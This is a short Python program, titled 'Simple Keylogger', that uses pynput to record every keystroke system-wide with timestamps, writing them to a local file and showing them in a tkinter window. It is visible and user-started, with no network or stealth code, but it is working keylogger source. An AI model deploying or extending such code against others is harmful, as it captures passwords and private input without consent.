import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard
import threading
import datetime

LOG_FILE = "key_log.txt"
listener = None

# Save logs to a file
def write_log(text):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(text + '\n')

# Called on each key press
def on_press(key):
    timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    try:
        log_line = f"{timestamp} {key.char}"
    except AttributeError:
        log_line = f"{timestamp} {key}"

    write_log(log_line)
    update_log_view(log_line + "\n")

# Stop logging on ESC key
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Start the keylogger in a background thread
def start_keylogger():
    def run_listener():
        global listener
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        listener.join()

    t = threading.Thread(target=run_listener, daemon=True)
    t.start()

# Update the GUI log viewer
def update_log_view(text):
    log_output.configure(state='normal')
    log_output.insert(tk.END, text)
    log_output.configure(state='disabled')
    log_output.see(tk.END)

# Exit the app
def quit_app():
    if listener:
        listener.stop()
    root.quit()

# GUI setup
root = tk.Tk()
root.title("Simple Keylogger")
root.geometry("500x400")

tk.Label(root, text="Live Keystroke Log", font=("Arial", 12, "bold")).pack(pady=5)

log_output = scrolledtext.ScrolledText(root, wrap=tk.WORD, height=15, state='disabled')
log_output.pack(padx=10, pady=5, fill=tk.BOTH, expand=True)

btn_frame = tk.Frame(root)
btn_frame.pack(pady=10)

tk.Button(btn_frame, text="Start Logging", command=start_keylogger).pack(side=tk.LEFT, padx=10)
tk.Button(btn_frame, text="Exit", command=quit_app).pack(side=tk.RIGHT, padx=10)

root.protocol("WM_DELETE_WINDOW", quit_app)
root.mainloop()